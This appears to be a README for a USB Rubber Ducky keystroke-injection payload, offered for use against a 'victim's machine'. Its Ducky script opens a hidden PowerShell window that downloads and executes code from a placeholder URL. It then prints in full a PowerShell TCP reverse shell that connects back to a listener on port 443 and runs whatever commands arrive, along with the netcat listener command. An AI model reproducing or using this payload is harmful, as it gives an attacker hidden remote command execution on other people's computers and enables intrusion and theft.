Author of the payload: Me

Author of the powershell reverse shell: https://gist.github.com/ohpe

Description: A normal powershell reverse shell running in the background of the victim's machine.

Note: At the beginning of the script the USB Rubber Ducky waits 2.5 seconds to give the machine time to recognize it as a keyboard, this value can be reduced, reducing the total time the script will take to run.

Have fun!

Script:
```
DELAY 2500
GUI d
DELAY 500
GUI r
DELAY 100
STRING powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('<PAYLOAD URL>');"
ENTER
```

The payload url can be any website containing only the raw payload (Pastebin, Hastebin or you can host it with php or apache).

The payload url should contain this (Modified version of the original ohpe's powershell reverse shell): 

```Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser; $client = New-Object System.Net.Sockets.TCPClient('<LISTENER'S IP ADDRESS>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()```


On the listener machine you should run nc with this command:
```
nc -l -p 443

```

